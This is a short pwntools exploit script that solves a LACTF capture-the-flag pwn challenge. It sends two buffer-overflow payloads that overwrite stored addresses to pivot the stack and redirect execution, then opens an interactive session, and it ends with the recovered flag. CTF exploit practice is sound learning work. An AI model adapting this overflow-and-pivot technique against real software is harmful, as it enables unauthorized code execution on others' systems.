from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h']

# p = gdb.debug('./chall', '''
#     b *(vuln+51)
#     continue
# ''')

p = remote('chall.lac.tf', 31593)

p.recvuntil(b"Hey there, I'm deaddead. Who are you?\n")
payload1 = b'A' * 0x20 + p64(0x404540+0x1f) + p64(0x4012c1)
p.send(payload1)

p.recvuntil(b"Hey there, I'm deaddead. Who are you?\n")
payload2 = p64(0xf1eeee2d) + b'A' * 0x1f + p64(0x4011d6)
p.send(payload2)

p.interactive()

# lactf{1s_tHi5_y0Ur_1St_3vER_p1VooT}
